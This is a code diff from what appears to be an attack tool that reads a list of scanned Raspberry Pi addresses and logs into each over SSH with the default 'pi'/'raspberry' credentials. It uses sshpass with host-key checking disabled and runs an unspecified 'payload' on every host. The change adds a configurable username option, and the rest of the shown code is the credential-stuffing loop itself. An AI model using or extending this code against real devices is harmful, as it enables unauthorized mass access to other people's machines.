@@ -18,6 +18,8 @@ parser.add_argument('-r', dest='ip_range', type=str, default='--localnet',
 parser.add_argument('-f', dest='ip_list', type=str, default='./scan/RPI_list',
                     help='IP list to use (Default ./scan/RPI_list)')
 
+parser.add_argument('-u', dest='uname', type=str, default='pi',
+                    help='Username to use when ssh\'ing')
 parser.add_argument('-c', dest='creds', type=str, default='raspberry',
                     help='Password to use when ssh\'ing')
 
@@ -89,9 +91,9 @@ def RPI():
         while i < len(lines):
 		print colored("Sending payload to ", "yellow"), colored(lines[i], "yellow")
 		if args.safe:
-			print("sshpass -p \""+args.creds+"\" ssh -o StrictHostKeyChecking=no pi@"+lines[i]+" "+payload)
+			print("sshpass -p \""+args.creds+"\" ssh -o StrictHostKeyChecking=no "+args.uname+"@"+lines[i]+" "+payload)
 		else:
-			os.system("sshpass -p \""+args.creds+"\" ssh -o StrictHostKeyChecking=no pi@"+lines[i]+" "+payload)
+			os.system("sshpass -p \""+args.creds+"\" ssh -o StrictHostKeyChecking=no "+args.uname+"@"+lines[i]+" "+payload)
 			print("\n")
 		i+=1
 	exit
